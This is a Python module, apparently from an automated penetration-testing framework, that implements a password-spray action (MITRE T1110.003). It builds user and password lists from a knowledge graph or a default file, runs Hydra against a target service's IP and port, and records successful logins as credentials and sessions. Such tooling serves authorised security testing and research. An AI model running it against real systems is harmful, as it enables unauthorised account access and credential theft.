import json

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern, Relationship
from kg_api.query import Query
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif, StateChangeOperation


class HydraConfig:
    """Hydra-related constants and helpers for password-spray action."""

    ARTEFACT_SCAN_RESULTS = "scan_results_json"
    DEFAULT_USERS_FILE = "password_spray_default_users.lst"
    HYDRA_SUPPORTED_PROTOCOLS = frozenset({
        "ssh", "ftp", "telnet", "http", "https", "http-get", "http-post",
        "mysql", "mssql", "postgres", "rdp", "smb", "vnc",
    })
    PROTOCOL_ALIASES = {"postgresql": "postgres"}
    USERS_NON_NULL = "[u IN collect(DISTINCT users) WHERE u IS NOT NULL]"

    @classmethod
    def acceptable_protocols(cls) -> list:
        """Protocols the query may match (Hydra-supported + alias keys like postgresql)."""
        return list(cls.HYDRA_SUPPORTED_PROTOCOLS | set(cls.PROTOCOL_ALIASES.keys()))


class PasswordSprayAction(Action):
    """Password spray via Hydra: one password against known users on a service (SSH, FTP, etc.).
    Example use of the hydra action:
    - hydra -L users.txt -P password.txt -o output.json -b json -t 4 ftp://10.10.10.10
    """

    def __init__(self):
        super().__init__("PasswordSpray", "T1110.003", "TA0006", ["noisy", "fast"])
        self.noise = 0.8
        self.impact = 0.7
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """Asset + OpenPort + Service + User + Credentials (password)."""
        input_motif = ActionInputMotif(
            name="InputMotif_PasswordSprayAction",
            description="Input motif for PasswordSprayAction"
        )

        input_motif.add_template(
            template_name="existing_asset",
            entity=Entity('Asset', alias='asset'),
        )

        input_motif.add_template(
            template_name="existing_port",
            entity=Entity('OpenPort', alias='port'),
            match_on="existing_asset",
            relationship_type="has",
            invert_relationship=True,
        )

        input_motif.add_template(
            template_name="existing_service",
            entity=Entity('Service', alias='service'),
            match_on="existing_port",
            relationship_type="is_running",
            invert_relationship=True,
        )

        input_motif.add_template(
            template_name="existing_user",
            entity=Entity('User', alias='users'),
            match_on="existing_service",
            relationship_type="is_client",
        )

        input_motif.add_template(
            template_name="spray_password",
            entity=Entity('Credentials', alias='credentials'),
            expected_attributes=["password"],
        )

        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """Credentials, User, Session for successful logins (linked to Service)."""
        output_motif = ActionOutputMotif(
            name="OutputMotif_PasswordSprayAction",
            description="Output motif for PasswordSprayAction"
        )

        output_motif.add_template(
            entity=Entity('Credentials', alias='creds'),
            template_name="discovered_credentials",
            match_on=Entity('Service'),
            relationship_type='secured_with',
            operation=StateChangeOperation.MERGE_IF_NOT_MATCH
        )

        output_motif.add_template(
            entity=Entity('User', alias='user'),
            template_name="discovered_user",
            match_on=Entity('Service'),
            relationship_type='is_client',
            operation=StateChangeOperation.MERGE_IF_NOT_MATCH
        )

        output_motif.add_template(
            entity=Entity('Session', alias='session'),
            template_name="discovered_session",
            match_on=Entity('Service'),
            relationship_type='executes_on',
            expected_attributes=["id", "username", "password", "protocol", "active"],
            operation=StateChangeOperation.MERGE_IF_NOT_MATCH
        )

        return output_motif

    @staticmethod
    def _cred_list_from_pattern_creds(pattern_creds) -> list:
        """Return list of credential entities (handles 'entities' list or single entity)."""
        if not pattern_creds:
            return []
        return pattern_creds.get("entities") or [pattern_creds]

    @staticmethod
    def _passwords_from_creds(creds_ent) -> list[str]:
        """Return non-empty password strings from credentials (single entity or entities list)."""
        if not creds_ent or not getattr(creds_ent, "get", None):
            return []
        entities = creds_ent.get("entities")
        if entities:
            return [
                p for e in entities
                if getattr(e, "get", None) and (p := e.get("password")) and str(p).strip()
            ]
        pwd = creds_ent.get("password")
        return [pwd] if pwd and str(pwd).strip() else []

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action. Validates service and asset so that
        invalid patterns fail during planning with the same errors as function().
        """
        service = pattern.get("service")
        protocol_from_pattern = service.get("protocol") if getattr(service, "get", None) else None
        if not protocol_from_pattern:
            raise ValueError("Service has no protocol")

        asset = pattern.get("asset")
        ip_address = asset.get("ip_address") if getattr(asset, "get", None) else None
        if not ip_address:
            raise ValueError("Pattern has no asset or asset has no ip_address")

        users_ent = pattern.get("users")
        user_list = (users_ent.get("entities") or []) if getattr(users_ent, "get", None) else []
        count = len(user_list)

        passwords = self._passwords_from_creds(pattern.get("credentials"))
        if len(passwords) > 1:
            pwd_desc = f"{len(passwords)} password(s)"
        elif len(passwords) == 1:
            pwd_desc = f"'{passwords[0]}'"
        else:
            pwd_desc = "?"

        svc_id = getattr(service, "_id", "?")

        return [
            f"Try {pwd_desc} against {count} user(s) "
            f"on {protocol_from_pattern} service ({svc_id}) on {ip_address}"
        ]

    def get_target_query(self) -> Query:
        """Service + optional User(s) + Credentials (password). When no users in graph, use
        default user list (password_spray_default_users.lst)."""
        asset = self.input_motif.get_template("existing_asset").entity
        port = self.input_motif.get_template("existing_port").entity
        service = self.input_motif.get_template("existing_service").entity
        users = self.input_motif.get_template("existing_user").entity
        creds = self.input_motif.get_template("spray_password").entity

        query = Query()
        query.match(
            asset.with_edge(Relationship("has", alias="has", direction="r"))
            .with_node(port)
            .with_edge(Relationship("is_running", alias="is_running", direction="r"))
            .with_node(service)
        )
        query.optional_match(users - Relationship("is_client") - service)
        query.match(creds)
        query.where(service.protocol.is_not_null())
        query.where(service.protocol.is_in(HydraConfig.acceptable_protocols()))
        query.where(creds.password.is_not_null())
        query.where(creds.password != "")

        filtered = HydraConfig.USERS_NON_NULL
        query.carry(
            "asset, port, service, "
            f"CASE WHEN size({filtered}) = 0 THEN null ELSE {filtered} END AS users, "
            "collect(DISTINCT credentials) AS credentials"
        )
        query.ret_all()
        return query

    @staticmethod
    def _noop_result(reason: str) -> ActionExecutionResult:
        """Return a no-op execution result with the given reason."""
        return ActionExecutionResult(
            command=["noop"],
            stdout=reason,
            exit_status=0,
            artefacts={},
        )

    def _usernames_from_pattern(
        self, pattern: Pattern, artefacts: ArtefactManager
    ) -> list[str]:
        """Return usernames from pattern (users entities) or default file. Excludes
        'anonymous' only for FTP (where it is a well-known placeholder for anonymous
        access); for other protocols it is treated as a normal username."""
        service = pattern.get("service")
        protocol = service.get("protocol") if getattr(service, "get", None) else None
        exclude_anonymous = protocol and str(protocol).lower() == "ftp"

        users_ent = pattern.get("users")
        user_list = (users_ent.get("entities") or []) if getattr(users_ent, "get", None) else []
        seen: set[str] = set()
        usernames: list[str] = []
        for user in user_list:
            if user is None:
                continue
            name = (user.get("username") or user.get("name")) if getattr(user, "get", None) else None
            if not name or name in seen:
                continue
            if exclude_anonymous and name.lower() == "anonymous":
                continue
            seen.add(name)
            usernames.append(name)

        if usernames:
            return usernames
        try:
            in_uuid = artefacts.search(HydraConfig.DEFAULT_USERS_FILE)[0]
            with open(artefacts.get_path(in_uuid)) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#") or line in seen:
                        continue
                    if exclude_anonymous and line.lower() == "anonymous":
                        continue
                    seen.add(line)
                    usernames.append(line)
        except (IndexError, FileNotFoundError):
            # Default users file is optional; if missing or not found in artefacts,
            # simply fall back to usernames collected from the pattern.
            pass
        return usernames

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """Run Hydra: one or more passwords against all users for the service. When no users in pattern,
        use default user list (password_spray_default_users.lst)."""
        service = pattern.get("service")
        protocol_from_pattern = service.get("protocol") if getattr(service, "get", None) else None
        if not protocol_from_pattern:
            raise ValueError("Service has no protocol")
        hydra_protocol = HydraConfig.PROTOCOL_ALIASES.get(protocol_from_pattern, protocol_from_pattern)
        if hydra_protocol not in HydraConfig.HYDRA_SUPPORTED_PROTOCOLS:
            return self._noop_result(f"Hydra does not support protocol: {protocol_from_pattern}")

        passwords = self._passwords_from_creds(pattern.get("credentials"))
        if not passwords:
            return self._noop_result("no credentials with password in pattern; skipping")

        usernames = self._usernames_from_pattern(pattern, artefacts)
        if not usernames:
            return self._noop_result("no valid users in pattern or default list; skipping")

        users_path = artefacts.get_path(artefacts.placeholder("password_spray_users.lst"))
        pass_path = artefacts.get_path(artefacts.placeholder("password_spray_password.lst"))
        out_uuid = artefacts.placeholder("password-spray-output.json")
        out_path = artefacts.get_path(out_uuid)
        with open(users_path, "w") as f:
            f.write("\n".join(usernames) + "\n")
        with open(pass_path, "w") as f:
            f.write("\n".join(passwords) + "\n")

        asset = pattern.get("asset")
        ip_address = asset.get("ip_address") if asset else None
        if not ip_address:
            raise ValueError("Pattern has no asset or asset has no ip_address")
        port_ent = pattern.get("port")
        port_num = port_ent.get("number") if port_ent else None
        target = f"{hydra_protocol}://{ip_address}:{port_num}" if port_num is not None else f"{hydra_protocol}://{ip_address}"

        execres = shell(
            "hydra",
            ["-L", str(users_path), "-P", str(pass_path), "-o", str(out_path), "-b", "json", target],
        )
        execres.artefacts[HydraConfig.ARTEFACT_SCAN_RESULTS] = out_uuid
        return execres

    def parse_output(self, output: ActionExecutionResult, artefacts: ArtefactManager) -> dict:
        """Extract successful logins from Hydra JSON output."""
        key = output.artefacts.get(HydraConfig.ARTEFACT_SCAN_RESULTS)
        if key is None:
            raise ValueError(f"ActionExecutionResult missing artefacts[{HydraConfig.ARTEFACT_SCAN_RESULTS!r}]; cannot parse output.")
        with artefacts.open(key, "r") as f:
            results = json.load(f)
        creds = [
            {"username": r["login"], "password": r["password"]}
            for r in results.get("results", [])
            if r.get("login") and r.get("password")
        ]
        return {"discovered_credentials": creds}

    def populate_output_motif(self, pattern: Pattern, discovered_data: dict) -> StateChangeSequence:
        """Update existing Credentials (by service+username), add User and Session.
        When the input Credentials node has no username (password-only), match by uuid so we can
        update it with the discovered username once the spray succeeds."""
        self.output_motif.reset_context()
        service = pattern.get("service")
        protocol = service.get("protocol")
        cred_list = self._cred_list_from_pattern_creds(pattern.get("credentials"))
        single_cred = len(cred_list) == 1 and cred_list[0] and cred_list[0].get("uuid")
        single_cred_uuid = cred_list[0].get("uuid") if single_cred else None

        changes: StateChangeSequence = []
        updated_single_cred = False
        protocol = service.get("protocol") if service else None
        for cred_data in discovered_data["discovered_credentials"]:
            username = cred_data["username"]
            password = cred_data["password"]
            creds_entity = Entity("Credentials", alias="creds", username=username, password=password)
            # For a single input Credentials node (password-only), update that node once by UUID,
            # then use username-based matching for any additional discovered credentials.
            if single_cred and not updated_single_cred:
                match_creds = Entity("Credentials", alias="creds", uuid=single_cred_uuid)
                updated_single_cred = True
            else:
                match_creds = Entity("Credentials", alias="creds", username=username)
            creds_match = match_creds - Relationship("secured_with") - service

            changes.append((creds_match, "update", creds_entity))

            # Session is a KG record of a successful login only; Hydra does not keep a live
            # connection, so we do not register with SessionManager. active=False to reflect that.
            if (
                service
                and not service.get("anonymous_login")
                and protocol
                and str(protocol).lower() != "ftp"
            ):
                changes.append(self.output_motif.instantiate(
                    "discovered_session",
                    match_on_override=service,
                    id=f"spray_{username}_{protocol}",
                    username=username,
                    password=password,
                    protocol=protocol,
                    active=False,
                ))
        return changes

    def _normalize_anonymous_ftp_credentials(
        self, discovered_data: dict, pattern: Pattern
    ) -> dict:
        """
        When the service has anonymous_login=True, Hydra may report (ftp, <any_password>)
        as valid because vsFTPd accepts any password for the ftp user. Normalize such
        results to represent anonymous access: username anonymous, password empty.
        Only applies to FTP services.
        """
        service = pattern.get("service")
        protocol = service.get("protocol") if service else None
        if (
            not service
            or not service.get("anonymous_login")
            or not protocol
            or str(protocol).lower() != "ftp"
        ):
            return discovered_data
        anonymous_usernames = {"ftp", "anonymous"}
        normalized = []
        seen_anonymous = False
        for cred in discovered_data.get("discovered_credentials", []):
            username = (cred.get("username") or "").strip().lower()
            if username in anonymous_usernames:
                if not seen_anonymous:
                    normalized.append({"username": "anonymous", "password": ""})
                    seen_anonymous = True
            else:
                normalized.append(cred)
        discovered_data["discovered_credentials"] = normalized
        return discovered_data

    def capture_state_change(
        self, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """Parse Hydra output and apply Credentials/User/Session changes."""
        discovered_data = self.parse_output(output, artefacts)
        discovered_data = self._normalize_anonymous_ftp_credentials(discovered_data, pattern)
        return self.populate_output_motif(pattern, discovered_data)
